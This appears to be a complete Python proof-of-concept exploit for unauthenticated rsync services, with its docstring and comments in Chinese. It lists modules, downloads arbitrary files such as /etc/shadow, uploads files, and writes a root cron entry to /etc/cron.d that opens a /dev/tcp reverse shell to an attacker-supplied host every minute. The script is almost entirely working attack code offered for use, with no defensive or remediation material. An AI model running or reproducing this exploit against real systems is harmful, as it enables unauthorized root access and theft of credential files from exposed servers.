#!/usr/bin/env python3
"""
Rsync 未授权访问漏洞利用 POC
功能：
  - 探测 rsync 服务可用模块
  - 上传恶意 cron 文件实现反弹 Shell
  - 下载任意文件（如 /etc/passwd）
用法：
  反弹shell: python3 rsync_rce.py -t 192.168.1.10 -L 10.0.0.1 -P 4444
  下载文件:  python3 rsync_rce.py -t 192.168.1.10 --download /etc/shadow
  指定模块:  python3 rsync_rce.py -t 192.168.1.10 -m backup --upload local.txt /tmp/uploaded.txt
依赖: 需要系统安装 rsync 命令行工具
"""

import argparse
import os
import subprocess
import sys
import tempfile
import time

def run_rsync(args, timeout=30):
    """执行 rsync 命令并返回结果"""
    cmd = ["rsync"] + args
    print(f"[*] 执行: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if result.stderr:
            print(f"[!] stderr: {result.stderr.strip()}")
        return result.returncode == 0, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        print("[-] 命令超时")
        return False, "", "命令超时"

def list_modules(target, port=873):
    """列出 rsync 服务所有模块"""
    url = f"rsync://{target}:{port}/"
    success, out, err = run_rsync([url])
    if success:
        print(f"[+] 可用模块:\n{out}")
        return out
    else:
        print("[-] 无法列出模块，可能服务不可达或需认证")
        return None

def download_file(target, port, module, remote_path, local_path):
    """通过 rsync 下载文件"""
    src = f"rsync://{target}:{port}/{module}{remote_path}"
    success, out, err = run_rsync(["-av", src, local_path])
    if success:
        print(f"[+] 文件已下载到: {local_path}")
    else:
        print(f"[-] 下载失败: {err}")

def upload_file(target, port, module, local_path, remote_path):
    """通过 rsync 上传文件"""
    dst = f"rsync://{target}:{port}/{module}{remote_path}"
    success, out, err = run_rsync(["-av", local_path, dst])
    if success:
        print(f"[+] 文件已上传: {remote_path}")
        return True
    else:
        print(f"[-] 上传失败: {err}")
        return False

def generate_revshell_cron(lhost, lport):
    """生成反弹 shell 的 cron 任务内容"""
    # 每分钟执行一次反弹 shell
    # 注意 cron.d 文件的格式：分 时 日 月 周 用户 命令
    payload = f"* * * * * root /bin/bash -c 'exec /bin/bash -i &>/dev/tcp/{lhost}/{lport} 0>&1'\n"
    return payload

def exploit_revshell(target, port, module, lhost, lport):
    """写入 cron 任务反弹 shell"""
    # 生成 cron 文件内容
    cron_content = generate_revshell_cron(lhost, lport)
    with tempfile.NamedTemporaryFile(mode='w', suffix='.cron', delete=False) as f:
        f.write(cron_content)
        tmpfile = f.name

    # cron 文件在目标上的路径（确保模块映射到根目录）
    remote_path = "/etc/cron.d/rsync_shell"
    print(f"[*] 上传恶意 cron 任务到 {remote_path}")
    if upload_file(target, port, module, tmpfile, remote_path):
        print("[+] 上传成功，等待 cron 执行反弹 shell（每分钟执行一次）")
    else:
        print("[-] 上传失败，尝试其他模块或检查写权限")
    os.unlink(tmpfile)

def main():
    parser = argparse.ArgumentParser(description="Rsync 未授权访问漏洞利用 POC")
    parser.add_argument('-t', '--target', required=True, help='目标 IP 地址')
    parser.add_argument('-p', '--port', type=int, default=873, help='rsync 端口 (默认: 873)')
    parser.add_argument('-m', '--module', default='src', help='rsync 模块名称 (默认: src)')
    
    # 操作模式
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--list', action='store_true', help='列出所有模块')
    group.add_argument('--download', metavar='REMOTE_PATH', help='下载远程文件到当前目录')
    group.add_argument('--upload', nargs=2, metavar=('LOCAL', 'REMOTE'), help='上传本地文件到远程路径')
    group.add_argument('--revshell', action='store_true', help='通过写入 cron 任务反弹 shell')
    
    # 反弹 shell 参数
    parser.add_argument('-L', '--lhost', help='反弹 shell 监听地址')
    parser.add_argument('-P', '--lport', type=int, help='反弹 shell 监听端口')
    parser.add_argument('--timeout', type=int, default=30, help='rsync 命令超时(秒)')
    args = parser.parse_args()

    if args.list:
        list_modules(args.target, args.port)
        return

    if args.revshell:
        if not args.lhost or not args.lport:
            print("[-] 反弹 shell 需要指定 -L/--lhost 和 -P/--lport")
            sys.exit(1)
        exploit_revshell(args.target, args.port, args.module, args.lhost, args.lport)
        return

    if args.download:
        remote = args.download
        local = os.path.basename(remote) if remote != '/' else 'root'
        download_file(args.target, args.port, args.module, remote, local)
        return

    if args.upload:
        local_path, remote_path = args.upload[0], args.upload[1]
        if not os.path.exists(local_path):
            print(f"[-] 本地文件不存在: {local_path}")
            sys.exit(1)
        upload_file(args.target, args.port, args.module, local_path, remote_path)
        return

if __name__ == "__main__":
    main()